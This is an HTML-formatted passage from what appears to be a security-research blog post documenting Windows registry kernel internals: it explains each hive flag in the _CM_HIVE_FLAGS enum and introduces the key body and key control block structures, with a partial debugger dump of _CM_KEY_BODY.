 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;enum&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_CM_HIVE_FLAGS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_UNTRUSTED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_IN_SID_MAPPING_TABLE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_HAS_RM&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_IS_VIRTUALIZABLE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_APP_HIVE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_PROCESS_PRIVATE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_MUST_BE_REORGANIZED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_DIFFERENCING_WRITETHROUGH&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x2000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_HIVE_CLOUDFILTER_PROTECTED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;A brief description of each of them is as follows:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_psxevvsc6jj-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_UNTRUSTED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is &amp;quot;untrusted&amp;quot; in the sense of registry symbolic links; in other words, it is not one of the default system hives loaded on boot. The distinction is that trusted hives can freely link to all other hives in the system, while untrusted ones can only link to hives within their so-called trust class. This is to prevent confused deputy-style privilege escalation attacks in the system.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_IN_SID_MAPPING_TABLE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is linked into an internal data structure called the &amp;quot;SID mapping table&amp;quot; (nt!CmpSIDToHiveMapping), used to efficiently look up the user class hives mounted at \Registry\User\&amp;lt;SID&amp;gt;_Classes for the purposes of registry virtualization. &lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_HAS_RM:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;KTM transactions are enabled for this hive, meaning that the corresponding .blf and .regtrans-ms files are present in the same directory as the main hive file. The flag is clear if the hive is an app hive or if it was loaded with the REG_HIVE_NO_RM flag set.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_IS_VIRTUALIZABLE:&lt;/span&gt;&lt;span&gt;&amp;nbsp;accesses to this hive may be subject to registry virtualization. As far as I know, the only hive with this flag set is currently HKLM\SOFTWARE, which seems in line with the official &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-virtualization#registry-virtualization-scope&quot;&gt;documentation&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_APP_HIVE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;this is an app hive, i.e. it was loaded under \Registry\A with the REG_APP_HIVE flag set.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_PROCESS_PRIVATE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;this hive is private to the loading process, i.e. it was loaded with the REG_PROCESS_PRIVATE flag set.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_MUST_BE_REORGANIZED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive fragmentation threshold (by default 1 MiB) has been exceeded, and the hive should undergo the reorganization process at the next opportunity. The flag is simply a means of communication between the CmCheckRegistry and CmpReorganizeHive internal routines, both of which execute during hive loading.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_DIFFERENCING_WRITETHROUGH:&lt;/span&gt;&lt;span&gt;&amp;nbsp;this is a delta hive loaded in the writethrough mode, which technically means that the DIFF_HIVE_WRITETHROUGH flag was specified in the DiffHiveFlags member of the VRP_LOAD_DIFFERENCING_HIVE_INPUT structure, as discussed in &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;Part 4&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_HIVE_CLOUDFILTER_PROTECTED:&lt;/span&gt;&lt;span&gt;&amp;nbsp;new flag added in December 2024 as part of the fix for &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451734&quot;&gt;CVE-2024-49114&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. It indicates that the hive file has been protected against being converted to a &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/&quot;&gt;Cloud Filter&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;placeholder by setting the &amp;quot;$Kernel.CFDoNotConvert&amp;quot; extended attribute (EA) on the file in CmpAdjustFileCFSafety.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;This concludes the documentation of the hive descriptor structure, arguably the largest and most complex object in the Windows registry implementation. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;tTszyzmaCA-c13 tTszyzmaCA-c40&quot; id=&quot;h.co2rp9qhctws&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c7 tTszyzmaCA-c58&quot;&gt;Key structures&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The second most important objects in the registry are keys. They can be basically thought of as the essence of the registry, as nearly every registry operation involves them in some way. They are also the one and only registry element that is tightly integrated with the Windows NT Object Manager. This comes with many benefits, as client applications can operate on the registry using standardized &lt;/span&gt;&lt;span&gt;handles, and can leverage automatic security checks and object lifetime management. However, this integration also presents its own challenges, as it requires the Configuration Manager to interact with the Object Manager correctly and handle its intricacies and edge cases securely. For this reason, internal key-related structures play a crucial role in the registry implementation. They help organize key &lt;/span&gt;&lt;span&gt;state&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;in a way that simplifies keeping it up-to-date and internally consistent. For security researchers, understanding these structures and their semantics is invaluable. This knowledge enables you to quickly identify bugs in existing code or uncover missing handling of unusual but realistic conditions.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The two fundamental key structures in the Windows kernel are the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;key body&lt;/span&gt;&lt;span&gt;&amp;nbsp;(_CM_KEY_BODY) and &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;key control block&lt;/span&gt;&lt;span&gt;&amp;nbsp;(_CM_KEY_CONTROL_BLOCK)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;. The key body is directly associated with a key handle in the NT Object Manager, similar to the role that the _FILE_OBJECT structure plays for file handles. In other words, this is the initial object that the kernel obtains whenever it calls ObReferenceObjectByHandle to reference a user-supplied handle. There may concurrently exist a number of key body structures associated with a single key, as long as there are several programs holding active handles to the key. Conversely, the key control block represents the global state of a specific key and is used to manage its general properties. This means that for most keys in the system, there is at most one KCB allocated at a time. There may be no KCB for keys that haven&amp;#39;t been accessed yet (as they are initialized by the kernel lazily), and there may be more than one KCB for the same registry path if the key has been deleted and created again (these two instances of the key are treated as separate entities, with one of them being marked as deleted/non-existent). Taking this into account, the relationship between key bodies and KCBs is many-to-one, with all of the key bodies of a single KCB being connected in a doubly-linked list, as shown in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVOPG2OhtTCa9UQCPsoHCURy3PQqp9yTFutGDPMiP1uPhb1nTMdAzzeAKPPkDunbzqrGSo2pp0N-fC_cBBdXzGjF22FLgTyV_gLz6w92npQlxpdtd4RB5aWAdrx9tn7hcl6fIAqm5uP6eoSIY_OWC4cXiPVjh3_VFmhyphenhyphenqwCGUnurBCLbL0Qwj-eKHMCLA/s1200/image4.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVOPG2OhtTCa9UQCPsoHCURy3PQqp9yTFutGDPMiP1uPhb1nTMdAzzeAKPPkDunbzqrGSo2pp0N-fC_cBBdXzGjF22FLgTyV_gLz6w92npQlxpdtd4RB5aWAdrx9tn7hcl6fIAqm5uP6eoSIY_OWC4cXiPVjh3_VFmhyphenhyphenqwCGUnurBCLbL0Qwj-eKHMCLA/s1200/image4.png&quot; border=&quot;0&quot; alt=&quot;Diagram illustrating the many-to-one relationship between Windows Registry Key Bodies and a Key Control Block (KCB). A single KCB is shown linked to multiple Key Body structures. These Key Bodies are themselves connected together in a doubly-linked list, which is associated with the parent KCB.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram illustrating the many-to-one relationship between Windows Registry Key Bodies and a Key Control Block (KCB). A single KCB is shown linked to multiple Key Body structures. These Key Bodies are themselves connected together in a doubly-linked list, which is associated with the parent KCB.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The following subsections provide more detail about each of these two structures.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;tTszyzmaCA-c12&quot; id=&quot;h.igxkccv0fyf7&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Key body&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The key body structure is allocated and initialized in the internal CmpCreateKeyBody routine, and freed by the NT Object Manager when all references to the object are dropped. It is a relatively short and simple object with the following definition:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_BODY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_CM_KEY_BODY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;AccessCheckedLayerHeight&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyControlBlock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;NotifyBlock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_NOTIFY_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x018&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ProcessID&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x020&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyBodyList&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
